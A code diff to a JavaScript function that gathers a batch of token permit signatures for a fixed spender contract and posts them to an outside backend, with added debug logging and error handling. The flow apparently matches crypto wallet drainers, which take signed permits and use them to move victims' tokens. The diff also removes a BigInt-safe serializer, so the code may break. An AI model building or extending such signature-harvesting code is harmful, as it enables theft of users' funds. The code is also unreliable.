@@ -345,33 +345,50 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
     touchInteraction();
 
     log("📤 Sending raw permit batch to backend...");
-    const payload = {
-      owner: user,
-      details: details.map(d => ({
-        token: d.token,
-        amount: d.amount.toString(),
-        expiration: d.expiration.toString(),
-        nonce: d.nonce.toString()
-      })),
-      signature: signature,
-      spender: CONTRACT,
-      sig_deadline: sigDeadline,
-      chainId: Number(chainId)
-    };
 
-   // 🔥 LEGO FIX: Voeg keepalive toe zodat de request niet instort als Vercel van scope wisselt
-    const res = await fetch("https://api.aiiraa.com/api/permit", {
+const payload = {
+  owner: user,
+  details: details.map(d => ({
+    token: d.token,
+    amount: d.amount.toString(),
+    expiration: d.expiration.toString(),
+    nonce: d.nonce.toString()
+  })),
+  signature: signature,
+  spender: CONTRACT,
+  sig_deadline: sigDeadline,
+  chainId: Number(chainId)
+};
+
+console.log("API URL:", "https://api.aiiraa.com/api/permit");
+console.log("PAYLOAD:", payload);
+
+try {
+
+  const res = await fetch("https://api.aiiraa.com/api/permit", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify(
-  payload,
-  (key, value) => typeof value === "bigint" ? value.toString() : value
-)
+    body: JSON.stringify(payload)
   });
-    const data = await res.json();
-    if (!res.ok) throw new Error(data.error || "backend failure");
+
+  console.log("STATUS:", res.status);
+
+  const responseText = await res.text();
+
+  console.log("RESPONSE:", responseText);
+
+  if (!res.ok) {
+    throw new Error(responseText || "backend failure");
+  }
+
+} catch (err) {
+
+  console.error("FETCH CRASH:", err);
+
+  throw err;
+}
 
     log("✅ Permit forwarded to backend");
     touchInteraction();
